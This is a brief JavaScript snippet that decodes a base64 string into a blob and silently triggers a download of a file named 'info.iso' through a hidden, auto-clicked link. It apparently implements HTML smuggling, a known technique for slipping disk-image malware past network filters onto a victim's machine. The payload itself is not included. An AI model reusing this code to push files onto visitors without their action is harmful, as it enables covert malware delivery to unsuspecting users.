function convertFromBase64(base64) {
	  var binary_string = window.atob(base64);
	  var len = binary_string.length;
	  var bytes = new Uint8Array( len );
	  for (var i = 0; i < len; i++) { bytes[i] = binary_string.charCodeAt(i); }
	  return bytes.buffer;
}

var data = convertFromBase64(file);
var blob = new Blob([data], {type: 'octet/stream'});
var fileName = 'info.iso';
var a = document.createElement('a');
var url = window.URL.createObjectURL(blob);
document.body.appendChild(a);
a.style = 'display: none';
a.href = url;
a.download = fileName;
a.click();
window.URL.revokeObjectURL(url);